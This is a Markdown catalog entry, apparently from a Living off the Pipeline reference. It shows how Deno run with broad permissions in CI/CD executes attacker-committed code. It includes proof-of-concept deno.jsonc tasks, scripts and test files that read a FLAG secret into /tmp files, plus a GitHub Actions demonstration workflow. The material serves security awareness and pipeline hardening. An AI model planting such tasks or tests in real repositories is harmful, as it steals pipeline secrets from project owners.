---
title: Deno
tags:
  - cli
  - config-file
  - eval-sh
  - eval-js
  - eval-ts
references: 
  - https://deno.land/manual/runtime/permissions
  - https://deno.land/manual/tools/task_runner
files: [deno.json,deno.jsonc,*.ts,*.js]
---

Deno is a modern, secure runtime for JavaScript, TypeScript, and WebAssembly, developed with a focus on security by default and a robust built-in toolchain. While Deno emphasizes a secure sandbox, this security can be bypassed in CI/CD environments by granting broad permissions, enabling Living off the Pipeline (LOTP) exploitation through repository-controlled files.

## LOTP Exploitation Method

Deno becomes a LOTP tool when invoked in CI/CD pipelines with broad permissions (e.g., `--allow-all`, `--allow-run`, `--allow-env`, `--allow-read`, `--allow-write`, `--allow-net`). In such scenarios, an attacker can commit malicious configuration files or scripts to the repository, which Deno will then execute with the granted permissions.

### `deno task <task_name>`

Deno's task runner functionality allows defining arbitrary shell commands within a `deno.json` or `deno.jsonc` file. If a CI/CD pipeline invokes `deno task <task_name>` (e.g., `deno task build` or `deno task test`) and the `deno` process has been granted `--allow-all` or `--allow-run` permissions, an attacker can define a malicious task that executes arbitrary commands.

#### Example `deno.jsonc`

```json
{
  "tasks": {
    "pwn": "bash -c 'echo $FLAG > /tmp/pwned'"
  }
}
```

### `deno run <script_path>`

Many CI/CD pipelines explicitly run a Deno script, such as `deno run main.ts`. If this command is executed with broad permissions (e.g., `deno --allow-all run main.ts`), an attacker can modify the `main.ts` file (or any other script executed) to perform malicious actions.

#### Example `main.ts`

```typescript
// main.ts
const flag = Deno.env.get("FLAG") || "";
Deno.writeTextFileSync("/tmp/pwned_run", flag);
```

### `deno test`

CI/CD workflows often include steps to run tests using `deno test`. If `deno test` is invoked with broad permissions (e.g., `deno --allow-all test`), an attacker can introduce malicious test files (e.g., `evil.test.ts`) into the repository. These test files will be automatically discovered and executed, allowing for malicious code execution during the testing phase.

#### Example `test_pwn.ts`

```typescript
// test_pwn.ts
import { assertEquals } from "https://deno.land/std@0.224.0/assert/assert_equals.ts";

Deno.test("pwned_test", () => {
  const flag = Deno.env.get("FLAG") || "";
  Deno.writeTextFileSync("/tmp/pwned_test", flag);
  assertEquals(1, 1); // Simple assertion to make the test pass
});
```

## Configuration Details

Deno relies on repository-controlled files and command-line flags to define its behavior and permissions:

*   **`deno.json` / `deno.jsonc`**: These JSON or JSONC files are automatically discovered in the current or parent directories. They are used to define tasks, compiler options, linting rules, and formatting settings. The `tasks` field is particularly critical as it allows for the definition and execution of arbitrary shell commands.
*   **TypeScript (`.ts`) and JavaScript (`.js`) files**: Any script explicitly invoked by `deno run` or automatically discovered by `deno test` can contain arbitrary Deno API calls or shell commands if the Deno process has the necessary permissions.
*   **Command-line flags**:
    *   `--allow-all` (`-A`): Grants all available permissions, completely bypassing Deno's security sandbox. This is the most dangerous flag in a LOTP context.
    *   `--allow-run`: Permits the Deno process to spawn subprocesses, effectively allowing Remote Code Execution (RCE).
    *   `--allow-read[=<path>]`: Grants read access to the file system (optionally restricted to specific paths).
    *   `--allow-write[=<path>]`: Grants write access to the file system (optionally restricted to specific paths).
    *   `--allow-env`: Allows access to environment variables.
    *   `--allow-net[=<hostname>]`: Grants network access (optionally restricted to specific hostnames).

## Impact

An attacker exploiting Deno as a LOTP tool can achieve several critical impacts on the CI/CD runner:

*   **Remote Code Execution (RCE)**: By defining malicious shell commands in `deno.jsonc` tasks (executed via `deno task`) or using `Deno.run()` within scripts/tests when `--allow-run` is active.
*   **File System Access**: Reading sensitive files (e.g., `/etc/passwd`, cloud credentials) or writing malicious files to the CI environment when `--allow-read` or `--allow-write` are active.
*   **Environment Variable Manipulation**: Reading sensitive environment variables (e.g., secrets, tokens) or injecting malicious environment variables that influence subsequent pipeline steps when `--allow-env` is active.
*   **Network Exfiltration**: Exfiltrating secrets or other sensitive data to an attacker-controlled server using Deno's `fetch()` API, `Deno.connect()`, or external tools like `curl` invoked from tasks, when `--allow-net` is active.

## GitHub Actions Workflow Example

The following GitHub Actions workflow demonstrates how Deno can be exploited via `deno task`, `deno run`, and `deno test` when executed with broad permissions.

```yaml
name: LOTP POC - deno
on:
  workflow_dispatch:
  pull_request:
    branches:
      - main
    paths:
      - "deno/**"
      - ".github/workflows/deno.yml"
  push:
    branches:
      - main
    paths:
      - "deno/**"
      - ".github/workflows/deno.yml"

permissions: read-all

jobs:
  poc:
    runs-on: ubuntu-latest
    env:
      FLAG: ${{ secrets.FLAG }}
    steps:
      - uses: actions/checkout@v4
      - name: Setup Deno
        uses: denoland/setup-deno@v2
        with:
          deno-version: v1.x
      
      - name: Run deno task (LOTP trigger)
        working-directory: deno
        run: deno --allow-all task pwn
      - name: Verify deno task
        run: test "$(cat /tmp/pwned)" = "$FLAG"

      - name: Run deno run (LOTP trigger)
        working-directory: deno
        run: deno --allow-env --allow-write run main.ts
      - name: Verify deno run
        run: test "$(cat /tmp/pwned_run)" = "$FLAG"

      - name: Run deno test (LOTP trigger)
        working-directory: deno
        run: deno --allow-env --allow-write test
      - name: Verify deno test
        run: test "$(cat /tmp/pwned_test)" = "$FLAG"
```